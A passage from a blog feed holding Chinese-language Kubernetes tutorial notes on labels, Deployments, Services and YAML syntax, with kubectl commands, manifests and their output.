&quot;nginx&quot; deleted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时，显示删除Pod成功，但是再查询，发现又新产生了一个</span> </span><br><span class="line">[root@master ~]# kubectl get pods -n dev</span><br><span class="line">NAME    READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx   1/1     Running   0          21s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这是因为当前Pod是由Pod控制器创建的，控制器会监控Pod状况，一旦发现Pod死亡，会立即重建</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时要想删除Pod，必须删除Pod控制器</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先来查询一下当前namespace下的Pod控制器</span></span><br><span class="line">[root@master ~]# kubectl get deploy -n  dev</span><br><span class="line">NAME    READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">nginx   1/1     1            1           9m7s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来，删除此PodPod控制器</span></span><br><span class="line">[root@master ~]# kubectl delete deploy nginx -n dev</span><br><span class="line">deployment.apps &quot;nginx&quot; deleted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">稍等片刻，再查询Pod，发现Pod被删除了</span></span><br><span class="line">[root@master ~]# kubectl get pods -n dev</span><br><span class="line">No resources found in dev namespace.</span><br></pre></td></tr></table></figure><p><strong>配置操作</strong></p><p>创建一个pod-nginx.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">pod</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure><p>然后就可以执行对应的创建和删除命令了：</p><p>创建：kubectl create -f pod-nginx.yaml</p><p>删除：kubectl delete -f pod-nginx.yaml</p><h2 id="4-3-Label"><a href="#4-3-Label" class="headerlink" title="4.3 Label"></a>4.3 Label</h2><p>Label是kubernetes系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。</p><p>Label的特点：</p><ul><li>一个Label会以key&#x2F;value键值对的形式附加到各种对象上，如Node、Pod、Service等等</li><li>一个资源对象可以定义任意数量的Label ，同一个Label也可以被添加到任意数量的资源对象上去</li><li>Label通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除</li></ul><p>可以通过Label实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。</p><blockquote><p>一些常用的Label 示例如下：</p><ul><li>版本标签：”version”:”release”, “version”:”stable”……</li><li>环境标签：”environment”:”dev”，”environment”:”test”，”environment”:”pro”</li><li>架构标签：”tier”:”frontend”，”tier”:”backend”</li></ul></blockquote><p>标签定义完毕之后，还要考虑到标签的选择，这就要使用到Label Selector，即：</p><p>Label用于给某个资源对象定义标识</p><p>Label Selector用于查询和筛选拥有某些标签的资源对象</p><p>当前有两种Label Selector：</p><ul><li><p>基于等式的Label Selector</p><p>name &#x3D; slave: 选择所有包含Label中key&#x3D;”name”且value&#x3D;”slave”的对象</p><p>env !&#x3D; production: 选择所有包括Label中的key&#x3D;”env”且value不等于”production”的对象</p></li><li><p>基于集合的Label Selector</p><p>name in (master, slave): 选择所有包含Label中的key&#x3D;”name”且value&#x3D;”master”或”slave”的对象</p><p>name not in (frontend): 选择所有包含Label中的key&#x3D;”name”且value不等于”frontend”的对象</p></li></ul><p>标签的选择条件可以使用多个，此时将多个Label Selector进行组合，使用逗号”,”进行分隔即可。例如：</p><p>name&#x3D;slave，env!&#x3D;production</p><p>name not in (frontend)，env!&#x3D;production</p><p><strong>命令方式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为pod资源打标签</span></span><br><span class="line">[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev</span><br><span class="line">pod/nginx-pod labeled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为pod资源更新标签</span></span><br><span class="line">[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite</span><br><span class="line">pod/nginx-pod labeled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看标签</span></span><br><span class="line">[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels</span><br><span class="line">NAME        READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">nginx-pod   1/1     Running   0          10m   version=2.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">筛选标签</span></span><br><span class="line">[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels</span><br><span class="line">NAME        READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">nginx-pod   1/1     Running   0          17m   version=2.0</span><br><span class="line">[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels</span><br><span class="line">No resources found in dev namespace.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除标签</span></span><br><span class="line">[root@master ~]# kubectl label pod nginx-pod version- -n dev</span><br><span class="line">pod/nginx-pod labeled</span><br></pre></td></tr></table></figure><p><strong>配置方式</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">&quot;3.0&quot;</span> </span><br><span class="line">    <span class="attr">env:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">pod</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure><p>然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml</p><h2 id="4-4-Deployment"><a href="#4-4-Deployment" class="headerlink" title="4.4 Deployment"></a>4.4 Deployment</h2><p>在kubernetes中，Pod是最小的控制单元，但是kubernetes很少直接控制Pod，一般都是通过Pod控制器来完成的。Pod控制器用于pod的管理，确保pod资源符合预期的状态，当pod的资源出现故障时，会尝试进行重启或重建pod。</p><p>在kubernetes中Pod控制器的种类有很多，本章节只介绍一种：Deployment。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200408193950807.png" alt="image-20200408193950807"></p><p><strong>命令操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令格式: kubectl create deployment 名称  [参数]</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--image  指定pod的镜像</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--port   指定端口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--replicas  指定创建pod数量</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--namespace  指定namespace</span></span><br><span class="line">[root@master ~]# kubectl create deploy nginx --image=nginx:latest --port=80 --replicas=3 -n dev</span><br><span class="line">deployment.apps/nginx created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看创建的Pod</span></span><br><span class="line">[root@master ~]# kubectl get pods -n dev</span><br><span class="line">NAME                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-5ff7956ff6-6k8cb   1/1     Running   0          19s</span><br><span class="line">nginx-5ff7956ff6-jxfjt   1/1     Running   0          19s</span><br><span class="line">nginx-5ff7956ff6-v6jqw   1/1     Running   0          19s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看deployment的信息</span></span><br><span class="line">[root@master ~]# kubectl get deploy -n dev</span><br><span class="line">NAME    READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">nginx   3/3     3            3           2m42s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">UP-TO-DATE：成功升级的副本数量</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AVAILABLE：可用副本的数量</span></span><br><span class="line">[root@master ~]# kubectl get deploy -n dev -o wide</span><br><span class="line">NAME    READY UP-TO-DATE  AVAILABLE   AGE     CONTAINERS   IMAGES              SELECTOR</span><br><span class="line">nginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看deployment的详细信息</span></span><br><span class="line">[root@master ~]# kubectl describe deploy nginx -n dev</span><br><span class="line">Name:                   nginx</span><br><span class="line">Namespace:              dev</span><br><span class="line">CreationTimestamp:      Wed, 08 May 2021 11:14:14 +0800</span><br><span class="line">Labels:                 run=nginx</span><br><span class="line">Annotations:            deployment.kubernetes.io/revision: 1</span><br><span class="line">Selector:               run=nginx</span><br><span class="line">Replicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable</span><br><span class="line">StrategyType:           RollingUpdate</span><br><span class="line">MinReadySeconds:        0</span><br><span class="line">RollingUpdateStrategy:  25% max unavailable, 25% max surge</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  run=nginx</span><br><span class="line">  Containers:</span><br><span class="line">   nginx:</span><br><span class="line">    Image:        nginx:latest</span><br><span class="line">    Port:         80/TCP</span><br><span class="line">    Host Port:    0/TCP</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Conditions:</span><br><span class="line">  Type           Status  Reason</span><br><span class="line">  ----           ------  ------</span><br><span class="line">  Available      True    MinimumReplicasAvailable</span><br><span class="line">  Progressing    True    NewReplicaSetAvailable</span><br><span class="line">OldReplicaSets:  &lt;none&gt;</span><br><span class="line">NewReplicaSet:   nginx-5ff7956ff6 (3/3 replicas created)</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason             Age    From                   Message</span><br><span class="line">  ----    ------             ----   ----                   -------</span><br><span class="line">  Normal  ScalingReplicaSet  5m43s  deployment-controller  Scaled up replicaset nginx-5ff7956ff6 to 3</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除</span> </span><br><span class="line">[root@master ~]# kubectl delete deploy nginx -n dev</span><br><span class="line">deployment.apps &quot;nginx&quot; deleted</span><br></pre></td></tr></table></figure><p><strong>配置操作</strong></p><p>创建一个deploy-nginx.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">          <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure><p>然后就可以执行对应的创建和删除命令了：</p><p>创建：kubectl create -f deploy-nginx.yaml</p><p>删除：kubectl delete -f deploy-nginx.yaml</p><h2 id="4-5-Service"><a href="#4-5-Service" class="headerlink" title="4.5 Service"></a>4.5 Service</h2><p>通过上节课的学习，已经能够利用Deployment来创建一组Pod来提供具有高可用性的服务。</p><p>虽然每个Pod都会分配一个单独的Pod IP，然而却存在如下两问题：</p><ul><li>Pod IP 会随着Pod的重建产生变化</li><li>Pod IP 仅仅是集群内可见的虚拟IP，外部无法访问</li></ul><p>这样对于访问这个服务带来了难度。因此，kubernetes设计了Service来解决这个问题。</p><p>Service可以看作是一组同类Pod<strong>对外的访问接口</strong>。借助Service，应用可以方便地实现服务发现和负载均衡。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200408194716912.png" alt="image-20200408194716912"></p><p><strong>操作一：创建集群内部可访问的Service</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">暴露Service</span></span><br><span class="line">[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n dev</span><br><span class="line">service/svc-nginx1 exposed</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看service</span></span><br><span class="line">[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide</span><br><span class="line">NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE     SELECTOR</span><br><span class="line">svc-nginx1   ClusterIP   10.109.179.231   &lt;none&gt;        80/TCP    3m51s   run=nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里产生了一个CLUSTER-IP，这就是service的IP，在Service的生命周期中，这个地址是不会变动的</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过这个IP访问当前service对应的POD</span></span><br><span class="line">[root@master ~]# curl 10.109.179.231:80</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">.......</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>操作二：创建集群外部也可访问的Service</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面创建的Service的<span class="built_in">type</span>类型为ClusterIP，这个ip地址只用集群内部可访问</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果需要创建外部也可以访问的Service，需要修改<span class="built_in">type</span>为NodePort</span></span><br><span class="line">[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n dev</span><br><span class="line">service/svc-nginx2 exposed</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时查看，会发现出现了NodePort类型的Service，而且有一对Port（80:31928/TC）</span></span><br><span class="line">[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide</span><br><span class="line">NAME          TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE    SELECTOR</span><br><span class="line">svc-nginx2    NodePort    10.100.94.0      &lt;none&gt;        80:31928/TCP   9s     run=nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来就可以通过集群外的主机访问 节点IP:31928访问服务了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如在的电脑主机上通过浏览器访问下面的地址</span></span><br><span class="line">http://192.168.5.4:31928/</span><br></pre></td></tr></table></figure><p><strong>删除Service</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service &quot;svc-nginx-1&quot; deleted</span><br></pre></td></tr></table></figure><p><strong>配置方式</strong></p><p>创建一个svc-nginx.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">svc-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="number">10.109</span><span class="number">.179</span><span class="number">.231</span> <span class="comment">#固定svc的内网ip</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br></pre></td></tr></table></figure><p>然后就可以执行对应的创建和删除命令了：</p><p>创建：kubectl create -f svc-nginx.yaml</p><p>删除：kubectl delete -f svc-nginx.yaml</p><blockquote><p><strong>小结</strong></p><p>至此，已经掌握了Namespace、Pod、Deployment、Service资源的基本操作，有了这些操作，就可以在kubernetes集群中实现一个服务的简单部署和访问了，但是如果想要更好的使用kubernetes，就需要深入学习这几种资源的细节和原理。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 3</title>
      <link href="/2022/07/10/4da150d363da-q1jun/"/>
      <url>/2022/07/10/4da150d363da-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="3-资源管理"><a href="#3-资源管理" class="headerlink" title="3. 资源管理"></a>3. 资源管理</h1><h2 id="3-1-资源管理介绍"><a href="#3-1-资源管理介绍" class="headerlink" title="3.1 资源管理介绍"></a>3.1 资源管理介绍</h2><p>在kubernetes中，所有的内容都抽象为资源，用户需要通过操作资源来管理kubernetes。</p><blockquote><p>kubernetes的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在kubernetes集群中运行一个个的容器，并将指定的程序跑在容器中。</p><p>kubernetes的最小管理单元是pod而不是容器，所以只能将容器放在<code>Pod</code>中，而kubernetes一般也不会直接管理Pod，而是通过<code>Pod控制器</code>来管理Pod的。</p><p>Pod可以提供服务之后，就要考虑如何访问Pod中服务，kubernetes提供了<code>Service</code>资源实现这个功能。</p><p>当然，如果Pod中程序的数据需要持久化，kubernetes还提供了各种<code>存储</code>系统。</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200406225334627.png" alt="image-20200406225334627"></p><blockquote><p>学习kubernetes的核心，就是学习如何对集群上的<code>Pod、Pod控制器、Service、存储</code>等各种资源进行操作</p></blockquote><h2 id="3-2-YAML语言介绍"><a href="#3-2-YAML语言介绍" class="headerlink" title="3.2 YAML语言介绍"></a>3.2 YAML语言介绍</h2><p>YAML是一个类似 XML、JSON 的标记性语言。它强调以<strong>数据</strong>为中心，并不是以标识语言为重点。因而YAML本身的定义比较简单，号称”一种人性化的数据格式语言”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">heima</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span>Beijing<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">heima</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">heima:</span></span><br><span class="line"><span class="symbol">  age:</span> <span class="number">15</span></span><br><span class="line"><span class="symbol">  address:</span> Beijing</span><br></pre></td></tr></table></figure><p>YAML的语法比较简单，主要有下面几个：</p><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格( 低版本限制 )</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li></ul><p>YAML支持以下几种数据类型：</p><ul><li>纯量：单个的、不可再分的值</li><li>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hash） &#x2F; 字典（dictionary）</li><li>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、Null、时间、日期</span></span><br><span class="line"><span class="comment"># 1 布尔类型</span></span><br><span class="line"><span class="attr">c1:</span> <span class="literal">true</span> <span class="string">(或者True)</span></span><br><span class="line"><span class="comment"># 2 整型</span></span><br><span class="line"><span class="attr">c2:</span> <span class="number">234</span></span><br><span class="line"><span class="comment"># 3 浮点型</span></span><br><span class="line"><span class="attr">c3:</span> <span class="number">3.14</span></span><br><span class="line"><span class="comment"># 4 null类型 </span></span><br><span class="line"><span class="attr">c4:</span> <span class="string">~</span>  <span class="comment"># 使用~表示null</span></span><br><span class="line"><span class="comment"># 5 日期类型</span></span><br><span class="line"><span class="attr">c5:</span> <span class="number">2018-02-17</span>    <span class="comment"># 日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="comment"># 6 时间类型</span></span><br><span class="line"><span class="attr">c6:</span> <span class="number">2018-02-17T15:02:31+08:00</span>  <span class="comment"># 时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br><span class="line"><span class="comment"># 7 字符串类型</span></span><br><span class="line"><span class="attr">c7:</span> <span class="string">heima</span>     <span class="comment"># 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 </span></span><br><span class="line"><span class="attr">c8:</span> <span class="string">line1</span></span><br><span class="line">    <span class="string">line2</span>     <span class="comment"># 字符串过多的情况可以拆成多行，每一行会被转化成一个空格</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对象</span></span><br><span class="line"><span class="comment"># 形式一(推荐):</span></span><br><span class="line"><span class="attr">heima:</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">15</span></span><br><span class="line">  <span class="attr">address:</span> <span class="string">Beijing</span></span><br><span class="line"><span class="comment"># 形式二(了解):</span></span><br><span class="line"><span class="attr">heima:</span> &#123;<span class="attr">age:</span> <span class="number">15</span>,<span class="attr">address:</span> <span 